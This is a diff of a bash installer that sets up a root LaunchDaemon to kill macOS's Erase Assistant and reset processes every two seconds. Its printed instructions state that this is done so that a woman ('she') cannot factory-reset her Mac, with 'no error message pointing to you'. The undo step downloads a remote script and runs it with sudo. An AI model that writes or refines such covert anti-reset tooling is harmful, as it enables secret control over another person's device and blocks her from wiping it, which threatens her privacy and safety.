@@ -37,10 +37,12 @@ warn() { echo -e "${YEL}WARNING: $1${NC}"; }
 
 info "Installing erase blocker..."
 
+mkdir -p /usr/local/bin
+
 cat > /usr/local/bin/block-erase.sh << 'SCRIPT'
 #!/bin/bash
-# Kills Erase Assistant / erasetool / systemreset on launch.
-# Called by launchd only when the process appears — no polling loop.
+# Kills Erase Assistant / erasetool / systemreset if running.
+# Called by launchd every 2 seconds.
 pkill -9 -f "Erase Assistant" 2>/dev/null
 pkill -9 -f "erasetool" 2>/dev/null
 pkill -9 -f "systemreset" 2>/dev/null
@@ -49,10 +51,9 @@ SCRIPT
 chmod +x /usr/local/bin/block-erase.sh
 success "Created erase blocker script"
 
-# ── Step 2: Create LaunchDaemons that trigger on process launch ──
-# Uses launchd's WatchPaths to monitor for the Erase Assistant app.
-# Zero CPU usage — launchd only runs the script when the path is accessed.
-info "Installing LaunchDaemons..."
+# ── Step 2: Create LaunchDaemon that polls for erase processes ──
+# Runs every 2 seconds — negligible CPU, catches erase attempts immediately.
+info "Installing LaunchDaemon..."
 
 cat > /Library/LaunchDaemons/com.joneshipit.block-erase.plist << 'PLIST'
 <?xml version="1.0" encoding="UTF-8"?>
@@ -66,47 +67,22 @@ cat > /Library/LaunchDaemons/com.joneshipit.block-erase.plist << 'PLIST'
 		<string>/bin/bash</string>
 		<string>/usr/local/bin/block-erase.sh</string>
 	</array>
-	<key>WatchPaths</key>
-	<array>
-		<string>/System/Library/CoreServices/Erase Assistant.app</string>
-	</array>
+	<key>StartInterval</key>
+	<integer>2</integer>
 </dict>
 </plist>
 PLIST
 
-# Second daemon: poll-based fallback in case WatchPaths misses it
-# Runs every 5 seconds ONLY — negligible CPU, catches edge cases
-cat > /Library/LaunchDaemons/com.joneshipit.block-erase-fallback.plist << 'PLIST2'
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-<plist version="1.0">
-<dict>
-	<key>Label</key>
-	<string>com.joneshipit.block-erase-fallback</string>
-	<key>ProgramArguments</key>
-	<array>
-		<string>/bin/bash</string>
-		<string>/usr/local/bin/block-erase.sh</string>
-	</array>
-	<key>StartInterval</key>
-	<integer>5</integer>
-</dict>
-</plist>
-PLIST2
-
 # Set correct permissions
 chown root:wheel /Library/LaunchDaemons/com.joneshipit.block-erase.plist
 chmod 644 /Library/LaunchDaemons/com.joneshipit.block-erase.plist
-chown root:wheel /Library/LaunchDaemons/com.joneshipit.block-erase-fallback.plist
-chmod 644 /Library/LaunchDaemons/com.joneshipit.block-erase-fallback.plist
 
-success "Created LaunchDaemons"
+success "Created LaunchDaemon"
 
-# ── Step 3: Load the daemons now ──
+# ── Step 3: Load the daemon now ──
 info "Starting erase blocker..."
-launchctl load -w /Library/LaunchDaemons/com.joneshipit.block-erase.plist 2>/dev/null
-launchctl load -w /Library/LaunchDaemons/com.joneshipit.block-erase-fallback.plist 2>/dev/null
-success "Erase blocker is active (event-driven + 5s fallback)"
+launchctl bootstrap system /Library/LaunchDaemons/com.joneshipit.block-erase.plist 2>/dev/null || launchctl load -w /Library/LaunchDaemons/com.joneshipit.block-erase.plist 2>/dev/null
+success "Erase blocker is active (2s interval)"
 
 echo ""
 
@@ -145,9 +121,9 @@ echo -e "${CYAN}How it works:${NC}"
 echo -e "  • 'Erase All Content and Settings' looks totally normal"
 echo -e "  • When clicked, the erase process starts and immediately dies"
 echo -e "  • She'll just see it fail/crash — no error message pointing to you"
-echo -e "  • The blocker uses zero CPU — only fires when the erase process launches"
+echo -e "  • The blocker polls every 2 seconds — negligible CPU"
 echo ""
 echo -e "${CYAN}To undo (when she needs to actually reset):${NC}"
-echo -e "  curl -L https://raw.githubusercontent.com/joneshipit/bypass-mdm-clean/main/unlock-mac.sh \\"
+echo -e "  curl -L https://raw.githubusercontent.com/joneshipit/prevent-reset/main/unlock-mac.sh \\"
 echo -e "    -o unlock-mac.sh && chmod +x unlock-mac.sh && sudo ./unlock-mac.sh"
 echo ""
